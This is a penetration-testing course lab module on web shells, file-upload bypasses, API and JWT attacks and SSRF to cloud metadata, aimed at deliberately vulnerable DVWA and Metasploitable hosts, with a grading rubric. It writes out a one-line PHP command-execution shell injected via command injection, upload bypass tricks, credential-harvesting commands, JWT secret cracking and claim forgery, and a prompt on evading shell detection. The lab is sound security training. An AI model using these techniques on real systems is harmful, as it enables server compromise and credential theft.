## 14.8 Lab: Web Shells & Application Layer Attacks

### Setup
- Kali Linux (10.10.1.10)
- DVWA (10.10.1.50) web app with multiple vulnerabilities
- Metasploitable 2 (10.10.1.20) with web services and misconfigurations
- Burp Suite

### Tasks

**Task 1: Identify Web Application Attack Surface**
1. On DVWA, use Burp Suite to map the application: crawl to discover pages/endpoints, identify input fields/parameters/APIs, note API endpoints or AJAX calls
2. On Metasploitable, enumerate web services: nmap -sV -p 80,8080,8180 10.10.1.20; curl http://10.10.1.20/; curl http://10.10.1.20:8080/
3. Document the attack surface for each web application

**Task 2: Deploy a Web Shell via File Upload**
1. On DVWA, navigate to the Upload section (if available at your security level)
2. Attempt to upload a PHP web shell: create a simple PHP shell, try bypasses: rename to .php.jpg/.php.png, modify Content-Type to image/jpeg, use null byte injection (shell.php%00.jpg for older PHP), use double extensions
3. If upload succeeds, access via: curl -X POST http://10.10.1.50/dvwa/images/shell.php -d "cmd=id"
4. If direct upload fails, use command injection to write shell: ; echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php
5. Document the upload method, bypasses needed, and verification

**Task 3: Web Shell Interaction and Exploration**
1. Use the web shell to enumerate filesystem (ls -la /, cat /etc/passwd, pwd), read config files (.env, config.php, database configs), search credentials (grep -r "password" /var/www/ 2>/dev/null), check network (ifconfig/ip addr), identify other services
2. Document findings through the web shell
3. If possible, establish a reverse shell via the web shell

**Task 4: API Reconnaissance and Attacks**
1. Identify API endpoints: look for /api/, /rest/, /graphql, /v1/, /v2/ paths, check JavaScript files for API URLs, use Burp Suite to intercept API calls
2. Test for vulnerabilities: IDOR (change user IDs, check unauthorized access), missing auth (access endpoints without valid token), excessive data exposure (responses with more data than needed), input validation (test parameters for injection)
3. Document API vulnerabilities found and demonstrate exploitability

**Task 5: JWT Analysis and Attacks**
1. If target uses JWT: capture JWT, decode (echo <token> | cut -d. -f2 | base64 -d), check algorithm (HS256/RS256/none) and claims
2. Attempt attacks: try "none" algorithm if supported, crack JWT secret if HS256 (hashcat -m 1700 jwt.txt rockyou.txt), modify claims (change "role": "user" to "role": "admin")
3. Document JWT analysis and successful attacks

**Task 6: Cloud Metadata SSRF Simulation**
1. If cloud lab available (AWS/Azure/GCP): find/create SSRF vulnerability, access cloud metadata service, retrieve IAM credentials, enumerate cloud resources
2. If no cloud lab: set up simulated metadata endpoint on lab server, create SSRF vulnerability that can reach it, demonstrate concept
3. Document SSRF to metadata to cloud enumeration chain

**Task 7: Web Shell Detection**
1. Find your own web shell: search recently modified PHP files, search suspicious patterns (eval, system, exec, etc.), check file permissions, check web server logs for shell access
2. Document what gives away your web shell and what is harder to detect
3. Reflect: how would you modify your web shell to be harder to detect?

**Task 8: Web Shell Removal and Cleanup**
1. Remove the web shell you created
2. Check for any other files created during exercise
3. Restore system to original state (or document what needs cleanup)
4. Document cleanup process - what traces remain after removal?

---

## 14.9 Expected Outcomes

By the end of this module, you should be able to:
- Deploy and use web shells on compromised web servers
- Understand web shell detection methods and OPSEC considerations
- Perform API reconnaissance and identify common API vulnerabilities
- Analyze and attack JWT-based authentication
- Understand cloud application attack surfaces (SSRF to metadata to cloud compromise)
- Understand the full application-layer attack chain from web vuln to cloud compromise

---

## 14.10 Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| Web shell deployment | 10 | Deploys web shell through vulnerability or bypass |
| Web shell usage | 10 | Uses shell to enumerate system and find information |
| API recon and attacks | 10 | Identifies API endpoints and tests for vulnerabilities |
| JWT analysis/attacks | 5 | Analyzes JWT tokens and attempts attacks |
| Cloud SSRF simulation | 10 | Demonstrates SSRF to metadata chain (or simulates) |
| Web shell detection awareness | 10 | Analyzes detectability, suggests detection methods |
| Report quality | 10 | Professional documentation of methodology, findings |
| **Total** | **65** | |

**Pass threshold:** 45/65 (69%)

### Report Requirements (4-5 pages)
1. Target web application overview - what was targeted, what technologies were in use
2. Web shell deployment - vulnerability used, bypass method, shell code, verification
3. Web shell findings - what was discovered through the shell (files, credentials, configs)
4. API attack results - endpoints found, vulnerabilities tested, outcomes
5. JWT analysis - token structure, attacks attempted, results
6. Cloud attack chain simulation - SSRF, metadata access, cloud enumeration (or conceptual walkthrough)
7. Detection and defense - how would defenders find the web shell, how to improve detection, defense recommendations